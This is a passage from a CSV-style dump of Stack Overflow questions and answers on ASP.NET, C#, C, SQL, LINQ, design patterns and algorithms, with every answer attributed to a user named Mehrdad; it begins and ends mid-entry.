<p>Thanks in advance for any wisdom shared.</p>
","33708","Mehrdad","<p>Use <code>Request.ApplicationPath</code> instead (only works if your app is set as a virtual directory in IIS)</p>
"
"<p>For academic and performance sake, given this crawl recursive web-crawling function (which crawls only within the given domain) what would be the best approach to make it run iteratively? Currently when it runs, by the time it finishes python has climbed to using over 1GB of memory which isn't acceptable for running in a shared environment.</p>

<pre><code>   def crawl(self, url):
    ""Get all URLS from which to scrape categories.""
    try:
      links = BeautifulSoup(urllib2.urlopen(url)).findAll(Crawler._match_tag)
    except urllib2.HTTPError:
      return
    for link in links:
      for attr in link.attrs:
        if Crawler._match_attr(attr):
          if Crawler._is_category(attr):
            pass
          elif attr[1] not in self._crawled:
            self._crawled.append(attr[1])
            self.crawl(attr[1])
</code></pre>
","33708","Mehrdad","<p>Use a BFS instead of crawling recursively (DFS): <a href=""http://en.wikipedia.org/wiki/Breadth_first_search"" rel=""nofollow"">http://en.wikipedia.org/wiki/Breadth_first_search</a></p>

<p>You can use an external storage solution (such as a database) for BFS queue to free up RAM.</p>

<p>The algorithm is:</p>

<pre><code>//pseudocode:
var urlsToVisit = new Queue(); // Could be a queue (BFS) or stack(DFS). (probably with a database backing or something).
var visitedUrls = new Set(); // List of visited URLs.

// initialization:
urlsToVisit.Add( rootUrl );

while(urlsToVisit.Count &gt; 0) {
  var nextUrl = urlsToVisit.FetchAndRemoveNextUrl();
  var page = FetchPage(nextUrl);
  ProcessPage(page);
  visitedUrls.Add(nextUrl);
  var links = ParseLinks(page);
  foreach (var link in links)
     if (!visitedUrls.Contains(link))
        urlsToVisit.Add(link); 
}
</code></pre>
"
"<blockquote>
  <p>See
  <a href=""http://stackoverflow.com/questions/690766/vss-or-svn-for-a-net-project"">http://stackoverflow.com/questions/690766/vss-or-svn-for-a-net-project</a>,
  among many other similar questions.</p>
</blockquote>

<p>There are a lot of options out there for ASP.Net Developers, some are total garbage and some are feature rich and pricey.</p>

<p>I've been using Visual Source Safe 2005 for a while when doing personal development, but only on my personal projects. It has issues, let me say.</p>

<p>The worst issue is that it doesn't seem to be able to handle ASP.Net Web Sites. Most things are never checked out on edit regardless of how you set it up and I usually have to Get Latest and say ""Keep local changes and Check Out"" to get that functionality.</p>

<p>Anyway, I wanted to see if anyone could help me move away from this monster to something more stable. Team Foundation Server is obviously overkill. SourceVault is reliable, but kinda pricey. SVN is free, but all of the plugins that most other source control providers give you make it cost ""something"" when it's all said and done. </p>

<p>I was just wondering what everyone is using and if they can suggest a better way to go.</p>
","33708","Mehrdad","<p>VisualSVN is great but not free (though it's community license allows free use on non-domain computers). AnkhSVN is free. Bazaar doesn't have much integration with VS yet but it's great from command line.</p>

<p>For large scale projects, TFS is one way to go if you are looking for a centralized source control system. </p>

<p>I personally recommend switching to Git.</p>
"
"<p>compiling with gcc C99</p>

<p>I have been using enums for a while now. However, I am using some sample code to develop my application. And I came across some code like this. I have been informed this is the best practice use when using enums. But I don't see how this has any advantages.</p>

<pre><code>typedef enum {
    TYPE_DATE,
    TYPE_TIME,
    TYPE_MONEY,

    TYPE_COUNT,
    TYPE_UNKNOWN = TYPE_COUNT
} string_type_e;
</code></pre>

<p>Why have the <code>TYPE_COUNT</code> and why assign <code>TYPE_COUNT</code> to <code>TYPE_UNKNOWN</code>?</p>

<p>Many thanks for any suggestions,</p>
","33708","Mehrdad","<p>Enum values are basically integer constants. By default they are given the value of last element in the enum + 1 (and 0 for the first element). When you want to count the elements, which might be useful for mapping it with an array or something, of the enum declared like that (that will be updated dynamically if you add or remove something from it), you can put a COUNT constant at the end of it (<code>TYPE_COUNT</code> in your example). To be able to distinguish invalid values in the enum, you might want to declare another constant. In your example, that constant will be equal to the count constant, which is one value bigger than the largest value of your enum.</p>
"
"<p>I'm looking for reasons to use/not to use it and for original ideas (in their use and to replace them).
<hr>
Duplicate:</p>

<ul>
<li><a href=""http://stackoverflow.com/questions/160218/to-ternary-or-not-to-ternary"">To Ternary Or Not To Ternary</a></li>
</ul>

<p>Related (but does not address the question being asked):</p>

<ul>
<li><a href=""http://stackoverflow.com/questions/243217/which-coding-style-you-use-for-ternary-operator"">Which coding style you use for ternary operator?</a></li>
</ul>
","33708","Mehrdad","<p>It's something like the <code>for</code> loop. Makes sense for what it's made for but when you try to stick more stuff in it, it becomes unreadable.</p>
"
"<p>Is it ok to define tables primary key with 2 foreign key column that in combination must be unique? And thus not add a new id column (Guid or int)?</p>

<p>Is there a negative to this?</p>
","33708","Mehrdad","<p>Yes, it's completely OK. Why not? The downside of composite primary keys is that it can be long and it might be harder to identify a single row uniquely from the application perspective. However, for a couple integer columns (specially in junction tables), it's a good practice.</p>
"
"<p>I am not sure how to phrase a good question, so I will just say what I am after!</p>

<p>I have to retool a web application for our vendors and part of that requires restricting content on a vendor by vendor basis.  Looking at ASP.NET (MVC) this seems easy enough using the built in Authorization Filters and the IPrincipal and IIdentity interfaces (I haven't used them yet, just reading, so I may be using these terms incorrectly!).</p>

<p>What I'm not interested in doing is writing all the code for managing users and roles.  I would love to be able to assume all of this is done for me by a third party application, and my code simply specifies roles required.</p>

<p>Now, I'm not exactly sure the product I am after, or if it even exists.  Is this a CMS?  Right now our vendor site uses a very old version of DNN.  Some of our existing custom code is written as a module within DNN.  I am not interesting in this type of solution at all.  I want to be able to build a standard ASP.NET webapp and not be tied to a certain vendor 'module' definition.  It seems like this should be possible if the CMS / Portal implement custom providers behind the ASP.NET provided API's, yah?</p>

<p>The primary (only) customer here is developers, if that makes sense.</p>

<p>Notes:</p>

<ul>
<li><p>I really don't need a full blown CMS, which is why I'm confused on what type of product to search for.  Some CMS functionality might be nice, but the site is only for very specific vendor interaction that is going to be 95% custom.</p></li>
<li><p>I see that ASP.NET provies a website administration tool, and that is cool, but doesn't solve the public facing aspects of user interaction.</p></li>
</ul>
","33708","Mehrdad","<p>ASP.NET provides extensive membership and role management APIs that are pretty easy to work with since version 2.0. They are available in ASP.NET MVC. Probably they do not require much more work than you would do anyway for styling or other stuff. But since you don't want to do it anyway, you can use a simple Web form with a Login control in your MVC app and make routing ignore that path with:</p>

<pre><code>routes.IgnoreRoute(""SignIn.aspx"");
</code></pre>

<p>Just drag a login control to <code>SignIn.aspx</code> as you would in any Web form app.</p>
"
"<p>If I understand the parallel port right, sending data from (D0 to D7) simultaneous, but that it can control the sticks individually?
example:</p>

<pre><code>D0 = Input
D1 = Input
D2 = Output
...
...
...
D7 = Input
</code></pre>

<p>would it work?
what I want to do is to both send and receive data simultaneously. </p>

<p>thank.</p>
","33708","Mehrdad","<p>Of course by sending a number that has just the required bit set (2<sup>n</sup>) you'd get the expected result.</p>

<p>I'm not sure about bidirectional access though. I guess it's achieved by using control pins along with the data pins but that's just a guess.</p>
"
"<p>Let's say I have this SQL:</p>

<pre><code>SELECT p.ParentId, COUNT(c.ChildId)
FROM ParentTable p
  LEFT OUTER JOIN ChildTable c ON p.ParentId = c.ChildParentId
GROUP BY p.ParentId
</code></pre>

<p>How can I translate this into LINQ to SQL? I got stuck at the COUNT(c.ChildId), the generated SQL always seems to output COUNT(*). Here's what I got so far:</p>

<pre><code>from p in context.ParentTable
join c in context.ChildTable on p.ParentId equals c.ChildParentId into j1
from j2 in j1.DefaultIfEmpty()
group j2 by p.ParentId into grouped
select new { ParentId = grouped.Key, Count = grouped.Count() }
</code></pre>

<p>Thank you!</p>
","33708","Mehrdad","<pre><code>from p in context.ParentTable
join c in context.ChildTable on p.ParentId equals c.ChildParentId into j1
from j2 in j1.DefaultIfEmpty()
group j2 by p.ParentId into grouped
select new { ParentId = grouped.Key, Count = grouped.Count(t=&gt;t.ChildId != null) }
</code></pre>
"
"<p>I have a follow up question to <a href=""http://stackoverflow.com/questions/696472/given-a-private-key-is-it-possible-to-derive-its-public-key"">Given a private key, is it possible to derive itâs public key?</a></p>

<p>Are the public and the private keys the 'same' (in the sense that you just choose to make one public) or can you do more with the private key than with the public key?</p>

<p>EDIT - to better state my question:</p>

<p>When the two keys are generated, could I just randomly choose one of them to be the public key?</p>
","33708","Mehrdad","<p>It really depends on what you call ""private key."" In almost every practical sitation, the sender knowing the private key also knows the public key. It provides others with its public key so it needs to know it. So in essence, that ""private key"" will contain ""public key"" information or at least it can be derived from it.</p>

<p>Generally, you cannot swap private and public keys. In fact, they are not always of the same type (depending on the cryptosystem used).  For instance, in ECDSA, your public key is a two-dimensional ""point"" on an elliptic curve, whereas your private key is a number.</p>
"
"<p>I can't find a good article that solves my following issue, so if anyone has the answer or just a link to the answer I would be happy.</p>

<p>Let's say I have created a UserControl called MyUserControl.ascx</p>

<p>I reg it in ascx with prefix uc</p>

<pre><code>&lt;uc:MyUserControl runat=""server"" id=""uc_test"" SomeProperty=""true""&gt;
&lt;InnerContent&gt;
  ...
  Controls added in here....
  &lt;asp:Button runat=""server"" id=""btn_test"" Text=""Test""&gt;
  ...
&lt;InnerContent&gt;
&lt;/uc:MyUserControl&gt;
</code></pre>

<p>I know how to create a usercontrol and how to add properties and events to it.</p>

<p>BUT how do I make the ""InnerContent"" field in my usercontrol?</p>

<p>I have no clue so please be a little specific :)</p>

<p>Cheers</p>
","33708","Mehrdad","<p>You usually don't do that with user controls (<code>.ascx</code>). It's completely possible though. This is mostly done in custom controls you build using code files. To accomplish it, you declare your control class like:</p>

<pre><code>[ParseChildren(true), PersistChildren(false)]
public class MyControl : Control, INamingContainer {

   [PersistenceMode(PersistenceMode.InnerProperty),
    TemplateContainer(InnerContentTemplate)]
   public ITemplate InnerContent { get; set; }

   void CreateChildControls() { 
       InnerContentTemplate temp = new InnerContentTemplate();
       InnerContent.InstantiateIn(temp);
       Controls.Add(temp);
   }
}

public class InnerContentTemplate : Control, INamingContainer {

}
</code></pre>

<p>For <code>.ascx</code> files you could inherit it from <code>UserControl</code> instead.</p>

<p>Templating in ASP.NET is a rather complex thing. It's not really possible to explain everything in an answer. You should look at some samples and documentation.</p>
"
"<p>As much as I understand it is a good idea to keep passwords secret from the site administrator himself because he could try to take a user's email and log into his mailbox using the same password (since many users use the same password everywhere).</p>

<p>Beyond that I do not see the point. I know it makes more difficult the dictionary attack but... if someone unauthorized got into the database, isn't it too late to worry about passwords? The guy has now access to all tables in the database and in a position to take all the data and  do whatever he wants.</p>

<p>Or am I missing something?</p>
","33708","Mehrdad","<p>The guy might be in a position to do everything he/she wants to <strong>your system</strong>, but you shouldn't allow him/her to do anything with <em>other systems</em> (by using your users' passwords).</p>

<p>Password is a property of your users. You should keep it safely.</p>
"
"<p>I want to be able to effectively search an array for the contents of a string.<br />
Example:  </p>

<pre><code>dim arr() as string={""ravi"",""Kumar"",""Ravi"",""Ramesh""}
</code></pre>

<p>I pass the value is ""ra"" and I want it to return the index of 2 and 3.</p>

<p>How can I do this in VB.NET?</p>
","33708","Mehrdad","<pre><code>Dim inputString As String = ""ra""
Enumerable.Range(0, arr.Length).Where(Function(x) arr(x).ToLower().Contains(inputString.ToLower()))
</code></pre>
"
"<p>I can only assume it's an infinite loop.</p>

<p>Can I leave out any of the three expressions in a for loop? Is there a default for each when omitted?</p>
","33708","Mehrdad","<p>There are no defaults for first and third part (they default to nothing and it would work). The default for conditional expression is <code>true</code> which will make <code>for(;;)</code> effectively an infinite loop. (If the default was supposed to be <code>false</code>, it would have been useless to have such a construct).</p>
"
"<p>I'm writing a game development IDE that creates and compiles .NET projects (which I've been working on for the past few years) and am in the process of updating it to generate output not only for Windows/Visual Studio, but also for Linux/MonoDevelop (a thrillingly simple process for .NET, but still requiring some tweaks). </p>

<p>As part of this, I have found it necessary to start generating an app.config file as part of this to map dependent DLL names to Linux dependency names with &lt;dllmap&gt; elements.  I'm confused about who's responsible for copying the app.config file to the output name app.exe.config. In a Visual Studio project, the Build Action for app.config seems to normally be set to ""None"" and its settings indicate that it won't be copied anywhere, yet when Visual Studio compiles the project it generates app.exe.config (though I've sometimes found this to be unreliable).  When I use MSBuild to build a solution file generated by the IDE (for debugging purposes), MSBuild copies app.config to app.exe.config.  But when I compile the project with CSharpCodeProvider.CompileAssemblyFromFile it (naturally) doesn't like the config file being included as source code (""app.config(1,1) : error CS0116: A namespace does not directly contain members such as fields or methods""), and of course it doesn't copy it to the output when I don't include it as an input.  Is it my responsibility to simply copy app.config to app.exe.config independently, or is there a more standard way of doing this?</p>

<p>Is it hardwired to take the first *.config file?  In my IDE it's conceivable that the app.config file would be renamed or another one added (just as in Visual Studio).  It seems odd to me that the IDE has this secret action for config files (I think MonoDevelop behaves similarly in this regard because I couldn't find a special action for config files there either). I don't know how it even picks to what files this secret action applies.</p>
","33708","Mehrdad","<p>The C# compiler does not care about the config file at all. Build environments (MSBuild and VS) will take care of copying that file themselves.</p>
"
"<p>Are .NET collections with large number of items apt to be stored in the LOH?</p>

<p>I'm curious about List and Dictionary specifically. In my code, I store a large number (40k+) of relatively small objects (lets say 1k) in temporary Lists and Dictionarys for processing. Does the number of items in these collections increase the likelihood of being put on the LOH?</p>

<p>For list, assuming that List is implemented as a doubly linked list, then the number of elements should not increase the size of the actual List object, but I'd like to know for sure.</p>

<p>Thanks</p>
","33708","Mehrdad","<p><code>System.Collections.Generic.List</code> is implemented as an array internally, not a linked list. And yes, if the size of the collection is large it'll be allocated on large object heap (note that the size of the array is important, if you have a small array of large reference types, it won't be allocated on LOH).</p>
"
"<p>I'm writing an App that basically uses 5 business entities, A, B C, D and E</p>

<ul>
<li>A has some properties and holds a list of B's</li>
<li>B has some other properties and a list of C's and a list of D's</li>
<li>C has some other properties and a list of D's and a list of E's</li>
<li>D has only a few properties</li>
<li>E has only a few properties</li>
</ul>

<p>There is no inheritance between any of them.
There's no real business logic involved, the objects are created, populated, and then accessed read-only, no further manipulations. </p>

<p>My natural coding style would be to go object oriented and write classes for each of those entities, use NSArrays for the lists, and have the mentioned properties synthesized.</p>

<p>It would make the code readable.</p>

<p>But another approach seems obvious too: only use NSDictionaries and NSArrays, and working with keys/values instead of properties. This seems more efficient, and somehow ""closer"" to iPhone-style programming to me... but obviously leads to less readable code. Another advantage is there's no additional custom encoding/decoding for serialization required (persisting state to disk, using JSON, ...)
So on the paper, it speaks for the latter approach, on the other hand, it still feels somehow awkward NOT to use custom objects... </p>

<p>Is this really just <strong>a matter of taste question</strong>? Or are there maybe other arguments in favour/against one of the approaches? Is only using Dictionaries better memory/performance-wise? Is it the preferred ""Apple Coding Style""? (I'm coming from Java/C#).</p>
","33708","Mehrdad","<p>I don't see much difference between Java/C# and Cocoa in this area. Your question is equivalently applicable to those platforms as well (the same also applies to key-value stores and relational stores). </p>

<p>In an object oriented environment, you have to make a trade-off between the flexibility of the key-value approach for storing data and the structured and object oriented style. I'd go with the key-value approach only when I need the flexibility (e.g. the structure is dynamic and might change by user or not known at compile time). Otherwise, taking that route might get you completely off the OOP conventions and benefits (By the way, this is the important point. Does the hassle of sticking to object oriented principles worth it for that specific circumstance? I think your question reduces to this one and to answer it, you should analyze your specific situation)</p>
"
"<p>Is there any way to get ASP.Net to compile different folders independently?</p>

<p>I have a Web app that uses some commercial software.  The admin UI for this software is in a single folder -- there are about a 1,000 files in there, all told.  (I've looked through it -- it ain't the greatest code ever written...)</p>

<p>This folder takes <em>forever</em> to build.  If I build explicitly, it...slowly...compiles..subfolder...after...subfolder...  If I do the site as a Web site project (as opposed to a Web application project -- so no explicit build), I have waited up to <em>four or five minutes</em> to refresh a page on a simple code change.</p>

<p>Sometimes it just gets stuck -- I'll be waiting and waiting and I'll just hit F5 for giggles, and -- bam! -- there it is.  It apparently compiled sometime in the last 10 minutes but forgot to tell the browser about it...</p>

<p>How do I get this folder out of the general compilation?  I never change anything in here, and I wish ASP.Net would just compile the friggin' thing to an assembly and <em>leave it alone.</em></p>

<p>Possible?</p>
","33708","Mehrdad","<p>Why don't you use <a href=""http://msdn.microsoft.com/en-us/library/ms229863(VS.80).aspx"" rel=""nofollow""><code>aspnet_compiler</code></a> to precompile the application? It <strong>does</strong> work on Web site projects as well as Web application projects and it can precompile almost everything in an ASP.NET app.</p>
"
"<p>I have a simple udp listener written in c++ using win32 when I compile and run the program under debug mode it works perfectly, and I'm clearly able to see the information from the packets that I'm receiving. When I run this same code as a release build it compiles fine and seems to run fine, but its not printing out any packet information like it did under the release build. I've tried to mirror the build configurations to match exactly but its still happening. Any suggestions would be greatly appreciated. </p>
","33708","Mehrdad","<p>The code that outputs debugging information about the packets is probably stripped out for performance reasons in the release build.</p>

<p>This is done mostly by two things:</p>

<ul>
<li>conditional preprocessor directives that check against debug mode and generate appropriate code in that mode.</li>
<li>linking against debug version of libraries.</li>
</ul>

<p>Dropping those stuff is in fact, the primary purpose you are building a release version. You ain't gonna need debugging info so you won't be sacrificing performance for it. If you're really want to do so, then why don't you just ship the debug build [<em>update: as noted in a comment, seems the license doesn't allow you to distribute software linked against debug libs</em>]? It's the most similar configuration (you can't get more a config similar than identical, can you?)</p>
"
"<p>I have a function that processes a given vector, but may also create such a vector itself if it is not given. </p>

<p>I see two design choices for such a case, where a function parameter is optional: </p>

<p>Make it a pointer and make it <code>NULL</code> by default:</p>

<pre><code>void foo(int i, std::vector&lt;int&gt;* optional = NULL) {
  if(optional == NULL){
    optional = new std::vector&lt;int&gt;();
    // fill vector with data
  }
  // process vector
}
</code></pre>

<p>Or have two functions with an overloaded name, one of which leaves out the argument:</p>

<pre><code>void foo(int i) {
   std::vector&lt;int&gt; vec;
   // fill vec with data
   foo(i, vec);
}

void foo(int i, const std::vector&lt;int&gt;&amp; optional) {
  // process vector
}
</code></pre>

<p>Are there reasons to prefer one solution over the other? </p>

<p>I slightly prefer the second one because I can make the vector a <code>const</code> reference, since it is, when provided, only read, not written. Also, the interface looks cleaner (isn't <code>NULL</code> just a hack?). And the performance difference resulting from the indirect function call is probably optimized away.</p>

<p>Yet, I often see the first solution in code. Are there compelling reasons to prefer it, apart from programmer laziness? </p>
","33708","Mehrdad","<p>I, too, prefer the second one. While there are not much difference between the two, you are basically <em>using</em> the functionality of the primary method in the <code>foo(int i)</code> overload and the primary overload would work perfectly without caring about existence of lack of the other one, so there is more separation of concerns in the overload version.</p>
"
"<p>I believe the factory method design pattern is appropriate for what I'm trying to do, but I'm not sure how much responsibility (knowledge of subclasses it creates) to give it.  The example of using the <a href=""http://en.wikipedia.org/wiki/Factory%5Fmethod%5Fpattern"">factory method pattern</a> at Wikipedia describes the situation I'm in almost exactly:</p>

<pre><code>public class ImageReaderFactory 
{
    public static ImageReader getImageReader( InputStream is ) 
    {
        int imageType = figureOutImageType( is );

        switch( imageType ) 
        {
            case ImageReaderFactory.GIF:
                return new GifReader( is );
            case ImageReaderFactory.JPEG:
                return new JpegReader( is );
            // etc.
        }
    }
}
</code></pre>

<p>My question is, what does the <code>figureOutImageType</code> function look like?  In this specific example, I would assume that it checks a file header in the <code>InputStream</code> to determine which image format the data is in.  I would like to know if the <code>ImageReaderFactory</code> itself knows how to parse file headers and determine if the file type is GIF, JPEG, etc, or if it calls a function inside each <code>Reader</code> class that lets it know what type of image it is.  Something like this, maybe:</p>

<pre><code>int figureOutImageType(InputStream is)
{
    if(GifReader.isGIF(is))
        return ImageReaderFactory.GIF;
    else if(JpegReader.isJPEG(is))
        return ImageReaderFactory.JPEG;
    // etc.
}
</code></pre>

<p>It seems like having the factory know how to parse images breaks encapsulation, and letting the subclasses decide which one should be created is part of the factory method design pattern.  Yet, it also seems like the <code>figureOutImageType</code> function is just adding some redundant code, because why not just have each subclass perform its check on the <code>InputStream</code> in the <code>getImageReader</code> function and skip the switch case?  </p>

<p>I haven't had any experience using factories before, and I was hoping to get some insight from some people who have used them in the past on the best way to handle this problem.  Is it okay to have the factory know about the inner workings of its subclasses, or should they be responsible for letting the factory know which to create, and how do you organize it all?</p>

<p>Thanks!</p>
","33708","Mehrdad","<p>Factory should have some idea about choosing the actual object to create. For example, <code>WebRequest.Create</code> method in .NET, should be able to choose between the different protocol clients by checking the protocol part of the <code>Uri</code>. It doesn't need to parse the whole thing. Just the part required to distinguish which class is going to be responsible for it (in your example, it'll probably be just the file header).</p>

<p>Regarding your question about breaking encapsulation, not really... Most of the time, the factory is hardcoded and already knows about different types of classes and their features. It already depends on the functionality offered by a known set of classes, so you are not adding much to it. You can also encapsulate the detection part of the factory in another helper class that can be used both by the factory and the subclasses (in the sprit of DRY principle).</p>
"
"<p>The title speaks for itself .... </p>

<p>Does choice of container affects the speed of the default std::sort algorithm somehow or not? For example, if I use list, does the sorting algorithm just switch the node pointers or does it switch the whole data in the nodes?</p>
","33708","Mehrdad","<p>I don't think <code>std::sort</code> works on lists as it requires a random access iterator which is not provided by a <code>list&lt;&gt;</code>. Note that <code>list&lt;&gt;</code> provides a <code>sort</code> method but it's completely separate from <code>std::sort</code>.</p>

<p>The choice of container does matter. STL's <code>std::sort</code> relies on iterators to abstract away the way a container stores data. It just uses the iterators you provide to move elements around. The faster those iterators work in terms of accessing and assigning an element, the faster the <code>std::sort</code> would work.</p>
"
"<p>The transitive closure of a graph is defined e. g. here: <a href=""http://mathworld.wolfram.com/TransitiveClosure.html"" rel=""nofollow"">http://mathworld.wolfram.com/TransitiveClosure.html</a></p>

<p>It is easily possible in O(n^3), where n is the number of vertices. I was wondering if it can be done in time O(n^2).</p>
","33708","Mehrdad","<p>Nope. I don't think there is a O(n<sup>2</sup>) algorithm for it. I would expect if such an algorithm existed, you could solve all pair shortest paths problem in O(n<sup>2</sup>) too, which is not the case. The asymptotically fastest algorithm I can think of is an implementation of Dijkstra's shortest path algorithm with a Fibonacci heap (O(<em>n</em><sup>2</sup>log <em>n</em>) in not very dense graphs).</p>
"
"<p>I am adding a bunch of items to the ASP.NET cache with a specific prefix.
I'd like to be able to iterate over the cache and remove those items.</p>

<p>The way I've tried to do it is like so:</p>

<pre><code>    foreach (DictionaryEntry CachedItem in Cache)
    {
        string CacheKey = CachedItem.Key.ToString();
        if(CacheKey.StartsWith(CACHE_PREFIX){
            Cache.Remove(CacheKey);
        }
    }
</code></pre>

<p>Could I be doing this more efficiently?</p>

<p>I had considered creating a temp file and adding the items with a dependancy on the file, then just deleting the file. Is that over kill?</p>
","33708","Mehrdad","<p>You could write a subclass of <code>CacheDependency</code> that does the invalidation appropriately.</p>
"
"<p>What is the best way to implement a strategy for the constructor of a template/abstract class in C#?
I have several classes which are all based on parsing a string inside the constructor.
The parsing is done in a static method which creates list of key value pairs and is common for all classes, but some fields are also common for all classes - thus I use a abstract template class.</p>

<p>The problem is that I do not see a way to inherite the implementation of the constructor of the abstract base class. Otherwise I would implement the constructor strategy in the base class and  would force the handling of the lists inside some abstract methods.</p>

<p>Edit:
Added Not working code for the template class</p>

<pre><code>public abstract class XXXMessageTemplate 
{
    public XXXMessageTemplate(string x) // implementation for the constructor 
   {
       Parse(x);//general parse function
       CommonFields();//filling common properties
       HandlePrivateProperties();//fill individual properties
       HandlePrivateStructures();//fill individual structures
    }
    abstract void HandlePrivateProperties();
    abstract void HandlePrivateStructures();
}

The actual messages should not implement any constructor and only implement the HandlePrivateProperties and HandlePrivateStructures functions.
</code></pre>
","33708","Mehrdad","<p>Provide a constructor for the base class and use it in the derived classes:</p>

<pre><code>abstract class Base {
     // ...
     protected Base(string commonField) {
        CommonField = commonField;
     }
}

class Derived1 : Base {
     public Derived1(string commonField, string specificField) : base(commonField) {
        SpecificField = specificField;
     }
}
</code></pre>
"
"<p>I am having problems with VS2008 moving the windows around and losing tabs when I close it and open again, or when I go from coding to debugging and back. (Yes, I know that it is supposed to save different layouts for coding and debugging). I have tried exporting my settings, but it informs me helpfully that </p>

<p>""Your settings were exported, but there were some errors. Error 1:  Some command bar settings were not exported correctly due to an internal error.""</p>

<p>Importing them again gives a similar error, and doesn't solve the problem. Does anyone know where VS saves the layout info? Or how to reinitialise the layout, without changing all my other settings? Thanks!</p>
","33708","Mehrdad","<ul>
<li>Export your current settings. Don't choose to export the layout settings.</li>
<li>Reset IDE settings to your favorite </li>
<li>Import your exported settings</li>
</ul>
"
"<p>In my page source I put: <code>&lt;!-- A comment --------&gt;</code></p>

<p>and ASP.Net converts it to: <code>&amp;lt;!-- A comment --------&amp;gt;</code></p>

<p>so by the time it gets to the browser, my comment is visible.</p>

<p>It doesn't do it to all comments and if I add in another comment it sometimes makes the comment go away.</p>

<p>Anyone seen this before? How can I fix it?</p>
","33708","Mehrdad","<p>Try putting an space before <code>--&gt;</code>. It guess this might help. I haven't had such a problem before though.</p>

<p>It's a good practice:</p>

<ul>
<li><strong>not to have -- in comments</strong></li>
<li><strong>begin your comments with <code>&lt;!--</code> without more dashes</strong></li>
<li><strong>end your comments with <code>--&gt;</code> without more dashes</strong></li>
</ul>
"
"<p>I have an mvc app developed and tested with Cassini. Deployed to my site on GoDaddy, and the default page comes up fine. Click to log in, and I get a 404.</p>

<p>I'm running under IIS 7 there, so this is unexpected. My routes are pretty plain:</p>

<pre><code>        routes.IgnoreRoute(""{resource}.axd/{*pathInfo}"");

        routes.MapRoute(
            ""Default"",                                              
            ""{controller}/{action}/{id}"",                           
            new { controller = ""Public"", action = ""Index"", id = """" } 
        );
        routes.MapRoute(
            ""Report1"",
            ""Report/{action}/{start}/{end}"",
            new { controller = ""Report"", action = ""Index"" }
        );
        routes.MapRoute(
            ""Report2"",
            ""Report/{action}/{start}/{end}/{idList}"",
            new { controller = ""Report"", action = ""Index"" }
        );
</code></pre>

<p>Any idea what might be going on or how I can troubleshoot this?</p>
","33708","Mehrdad","<p>Are you running in IIS7 <strong>integrated mode</strong>?</p>

<p>Classic mode of IIS7 does <strong>not</strong> automatically map extensionless URLs to ASP.NET (much like IIS6).</p>

<p>Also make sure your <code>Web.config</code> <code>&lt;system.webServer&gt;</code> tag is configured correctly.</p>
"
"<p>Am I able to access an array component directly such as:</p>

<p>String x = args[1] ?</p>

<p>or do I have to use a loop and use args[i] ?</p>
","33708","Mehrdad","<p>Surely you can use args[1] too.</p>
"
"<p>Can I have an aspx page written with a C# code behind file.  And include an asp page with code written in vb?</p>
","33708","Mehrdad","<p>Yes, you can have an ASP.NET C# page with VB.NET codebehind. You cannot have classic ASP VBScript page included using <code>&lt;!--# include --&gt;</code>.</p>
"
"<p>Consider a C struct:</p>

<pre><code>struct T {
    int x;
    int y;
};
</code></pre>

<p>When this is partially initialized as in </p>

<pre><code>struct T t = {42};
</code></pre>

<p>is <em>t.y</em> guaranteed to be 0 or is this an implementation decision of the compiler?</p>
","33708","Mehrdad","<p>It's guaranteed to be 0 if it's partially initialized, just like array initializers. If it's uninitialized, it'll be unknown.</p>

<pre><code>struct T t; // t.x, t.y will NOT be initialized to 0 (not guaranteed to)

struct T t = {42}; // t.y will be initialized to 0.
</code></pre>

<p>Similarly:</p>

<pre><code>int x[10]; // Won't be initialized.

int x[10] = {1}; // initialized to {1,0,0,...}
</code></pre>

<p>Sample:</p>

<pre><code>// a.c
struct T { int x, y };
extern void f(void*);
void partialInitialization() {
  struct T t = {42};
  f(&amp;t);
}
void noInitialization() {
  struct T t;
  f(&amp;t);
}

// Compile with: gcc -O2 -S a.c

// a.s:

; ...
partialInitialzation:
; ...
; movl $0, -4(%ebp)     ;;;; initializes t.y to 0.
; movl $42, -8(%ebp)
; ...
noInitialization:
; ... ; Nothing related to initialization. It just allocates memory on stack.
</code></pre>
"
"<p>I have the following query:</p>

<pre><code>set ANSI_NULLS ON
set QUOTED_IDENTIFIER ON
go

ALTER PROCEDURE [dbo].[Validate]
@a varchar(50),
@b varchar(50) output

AS

SET @Password = 
(SELECT Password
FROM dbo.tblUser
WHERE Login = @a)

RETURN @b
GO
</code></pre>

<p>This compiles perfectly fine.</p>

<p>In C#, I want to execute this query and get the return value.</p>

<p>My code is as below:</p>

<pre><code>  SqlConnection SqlConn = new SqlConnection(System.Configuration.ConfigurationManager.ConnectionStrings[""MyLocalSQLServer""].ConnectionString.ToString());
        System.Data.SqlClient.SqlCommand sqlcomm = new System.Data.SqlClient.SqlCommand(""Validate"", SqlConn);

        string returnValue = string.Empty;

        try
        {
            SqlConn.Open();
            sqlcomm.CommandType = CommandType.StoredProcedure;

            SqlParameter param = new SqlParameter(""@a"", SqlDbType.VarChar);
            param.Direction = ParameterDirection.Input;
            param.Value = Username;
            sqlcomm.Parameters.Add(param);



            SqlParameter retval = sqlcomm.Parameters.Add(""@b"", SqlDbType.VarChar);
            retval.Direction = ParameterDirection.ReturnValue;


            string retunvalue = (string)sqlcomm.Parameters[""@b""].Value;
</code></pre>

<p>Note: Exception handling cut to keep the code short. Everytime I get to the last line, null is returned. What's the logic error with this code?</p>

<p>Thanks</p>
","33708","Mehrdad","<pre><code>retval.Direction = ParameterDirection.Output;
</code></pre>

<p><code>ParameterDirection.ReturnValue</code> should be used for the ""return value"" of the procedure, not output parameters. It gets the value returned by the SQL <code>RETURN</code> statement (with the parameter named <code>@RETURN_VALUE</code>).</p>

<p>Instead of <code>RETURN @b</code> you should <code>SET @b = something</code></p>

<p>By the way, return value parameter is always <code>int</code>, not string.</p>
"
"<p>Is there a way to have multiline strings in VB.NET like python</p>

<pre><code>a = """"""
multi
line
string
""""""
</code></pre>

<p>or php</p>

<pre><code>$a = &lt;&lt;&lt;END
multi
line
string
END;
</code></pre>

<p>?</p>

<p>Of course something that is not</p>

<pre><code>""multi"" &amp; _
""line
</code></pre>
","33708","Mehrdad","<p>I don't think VB.NET has such a feature.</p>
"
"<p>I have an ASP.NET page that is interacting with a business class. I want to continuously update controls on my page based on user entered values, e.g. update totals. The calculations are embedded in business logic but they're simple enough to reproduce elsewhere. I've thought of three ways to accomplish this:</p>

<ol>
<li>Dynamically update the page using JavaScript. I don't want to do this because I don't want to risk floating point math problems where the values on the page don't match the values calculated by the business class (those properties are decimals).</li>
<li>Clear calculated fields on changes and force the user to click a re-calculate button. This is a poor user experience and wiring up JavaScript to ASP.NET controls is tedious.</li>
